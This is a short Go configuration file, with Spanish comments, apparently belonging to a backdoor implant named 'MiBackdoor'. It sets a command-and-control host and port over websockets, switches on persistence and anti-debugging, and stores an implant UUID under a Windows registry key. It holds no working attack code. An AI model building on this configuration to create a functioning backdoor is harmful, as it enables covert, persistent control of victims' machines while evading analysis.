package config


const (
    Host              = "192.168.42.1"
    Port              = "5000"
    Mode              = "ws"
    EnablePersistence = true
    AntiDebug         = true

    // Clave y valor en el registro donde guardamos el UUID
    RegKeyPath = `Software\MiBackdoor`
	RegValue   = "UUID"
)

// UUID se carga al arrancar (si ya había uno) o se actualiza con PersistUUID.
var UUID string
